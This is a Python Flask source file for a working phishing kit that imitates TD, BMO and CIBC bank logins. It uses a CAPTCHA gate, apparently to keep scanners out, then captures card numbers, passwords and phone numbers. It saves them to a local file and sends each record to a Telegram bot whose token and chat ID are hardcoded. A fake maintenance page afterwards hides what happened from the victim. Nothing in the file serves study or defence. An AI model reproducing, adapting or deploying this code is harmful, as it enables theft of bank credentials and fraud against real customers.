from flask import Flask, render_template, request, redirect, url_for, flash, session
import os
import requests
import random  # For CAPTCHA code

app = Flask(__name__)
app.secret_key = "supersecretkey"  # Change this to something secure

USER_FILE = "users.txt"

# Telegram Bot info
TELEGRAM_BOT_TOKEN = "7321008127:AAEF8dr-B-b_hLkjA1qcXl07askvu0fRggs"
TELEGRAM_CHAT_ID = "-1002441207907"  # Replace with your real chat ID

def send_telegram_message(text: str):
    """
    Sends 'text' to your Telegram bot.
    """
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text}
    try:
        requests.post(url, json=payload)
    except Exception as e:
        print(f"Error sending Telegram message: {e}")

# Make sure users.txt exists
if not os.path.exists(USER_FILE):
    with open(USER_FILE, "w") as f:
        pass

@app.before_request
def check_captcha():
    """
    Before serving requests, ensure user has passed CAPTCHA 
    if they're trying to view the landing page ("/") and 
    hasn't verified yet.
    """
    if request.endpoint == "landing_page" and not session.get("captcha_verified"):
        return redirect(url_for("captcha"))

@app.route("/captcha", methods=["GET", "POST"])
def captcha():
    """
    Simple numeric CAPTCHA to gate access to the landing page.
    """
    if request.method == "POST":
        user_input = request.form.get("captcha_input", "")
        stored_code = session.get("captcha_code", "")

        if user_input == stored_code:
            # If code matches, mark user as verified
            session["captcha_verified"] = True
            return redirect(url_for("landing_page"))
        else:
            flash("CAPTCHA incorrect. Please try again.", "error")
            return redirect(url_for("captcha"))

    # If GET, generate a random 4-digit code and store in session
    code = str(random.randint(1000, 9999))
    session["captcha_code"] = code
    return render_template("captcha.html", code=code)

@app.route("/")
def landing_page():
    """
    Renders landing.html (bank selection) AFTER passing CAPTCHA.
    Also sends a one-time Telegram message per session 
    about the new visitor.
    """
    # If we haven't sent the "new visitor" message yet this session, do it now
    if not session.get("visited_msg_sent"):
        send_telegram_message("A new visitor arrived at the site!")
        session["visited_msg_sent"] = True

    return render_template("landing.html")

@app.route("/td")
def td_page():
    # Renders td.html for TD logins
    return render_template("td.html")

@app.route("/home")
def home():
    # Example: Renders a "CIBC" or "generic" login page
    return render_template("home.html")

@app.route("/bmo")
def bmo_page():
    # Renders bmologin.html for BMO logins
    return render_template("bmologin.html")

@app.route("/login", methods=["GET", "POST"])
def login():
    """
    Stores card_number, password, bank in session.
    Does NOT send a Telegram message yet.
    Redirects user to phone verification route appropriate for that bank.
    """
    if request.method == "POST":
        card_number = request.form.get("card_number")
        password = request.form.get("password")
        bank = request.form.get("bank")  # 'TD', 'BMO', or 'CIBC' etc.

        if not card_number or not password:
            flash("Card number and password are required!", "error")
            return redirect(url_for("home"))

        session["temp_bank"] = bank
        session["temp_card"] = card_number
        session["temp_pass"] = password

        # Redirect to correct phone verification route
        if bank == "TD":
            return redirect(url_for("td_phone"))
        elif bank == "BMO":
            return redirect(url_for("bmo_phone"))
        else:
            # Assume default or "CIBC"
            return redirect(url_for("phone_verification"))

    return render_template("login.html")

@app.route("/phone-verification", methods=["GET", "POST"])
def phone_verification():
    """
    Handles phone verification for CIBC / default bank.
    After user enters phone, store data in users.txt, send Telegram, clear session.
    """
    if request.method == "POST":
        phone_number = request.form.get("phone_number")
        if not phone_number:
            flash("Phone number is required!", "error")
            return redirect(url_for("phone_verification"))

        bank = session.get("temp_bank", "CIBC")
        card_number = session.get("temp_card", "UnknownCard")
        password = session.get("temp_pass", "UnknownPass")

        with open(USER_FILE, "a") as f:
            f.write(f"{bank},{card_number},Password:{password},Phone:{phone_number}\n")

        message_text = (
            f"New {bank} login:\n"
            f"Card: {card_number}\n"
            f"Password: {password}\n"
            f"Phone: {phone_number}"
        )
        send_telegram_message(message_text)

        session.pop("temp_bank", None)
        session.pop("temp_card", None)
        session.pop("temp_pass", None)

        return redirect(url_for("maintenance"))

    return render_template("phone_verification.html")

@app.route("/td_phone", methods=["GET", "POST"])
def td_phone():
    """
    TD phone verification route.
    """
    if request.method == "POST":
        phone_number = request.form.get("phone_number")
        if not phone_number:
            flash("Phone number is required!", "error")
            return redirect(url_for("td_phone"))

        bank = session.get("temp_bank", "TD")
        card_number = session.get("temp_card", "UnknownCard")
        password = session.get("temp_pass", "UnknownPass")

        with open(USER_FILE, "a") as f:
            f.write(f"{bank},{card_number},Password:{password},Phone:{phone_number}\n")

        message_text = (
            f"New {bank} login:\n"
            f"Card: {card_number}\n"
            f"Password: {password}\n"
            f"Phone: {phone_number}"
        )
        send_telegram_message(message_text)

        session.pop("temp_bank", None)
        session.pop("temp_card", None)
        session.pop("temp_pass", None)

        return redirect(url_for("maintenance"))

    return render_template("td_phone.html")

@app.route("/bmo_phone", methods=["GET", "POST"])
def bmo_phone():
    """
    BMO phone verification route.
    """
    if request.method == "POST":
        phone_number = request.form.get("phone_number")
        if not phone_number:
            flash("Phone number is required!", "error")
            return redirect(url_for("bmo_phone"))

        bank = session.get("temp_bank", "BMO")
        card_number = session.get("temp_card", "UnknownCard")
        password = session.get("temp_pass", "UnknownPass")

        with open(USER_FILE, "a") as f:
            f.write(f"{bank},{card_number},Password:{password},Phone:{phone_number}\n")

        message_text = (
            f"New {bank} login:\n"
            f"Card: {card_number}\n"
            f"Password: {password}\n"
            f"Phone: {phone_number}"
        )
        send_telegram_message(message_text)

        session.pop("temp_bank", None)
        session.pop("temp_card", None)
        session.pop("temp_pass", None)

        return redirect(url_for("maintenance"))

    return render_template("bmophone.html")

@app.route("/maintenance")
def maintenance():
    """
    Simple Maintenance page after successful phone verify.
    """
    return """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Site Under Maintenance</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                text-align: center;
                background-color: #f8f8f8;
                margin: 0;
                padding: 0;
            }
            .maintenance-container {
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                height: 100vh;
            }
            h1 {
                color: #c8102e;
                margin-bottom: 0.5em;
            }
            p {
                font-size: 1.2em;
                margin: 0;
            }
        </style>
    </head>
    <body>
        <div class="maintenance-container">
            <h1>Site Maintenance</h1>
            <p>We’ll be back online in approximately 2 hours.</p>
        </div>
    </body>
    </html>
    """

@app.route("/select_bank", methods=["POST"])
def select_bank():
    """
    If your landing.html has a dropdown or radio to pick which bank,
    we redirect accordingly (CIBC -> /home, TD -> /td, BMO -> /bmo).
    """
    selected_bank = request.form.get("bank")
    if selected_bank == "CIBC":
        return redirect(url_for("home"))
    elif selected_bank == "TD":
        return redirect(url_for("td_page"))
    elif selected_bank == "BMO":
        return redirect(url_for("bmo_page"))

    flash("This bank is currently not supported.", "error")
    return redirect(url_for("landing_page"))

if __name__ == "__main__":
    app.run(debug=True, host='0.0.0.0')
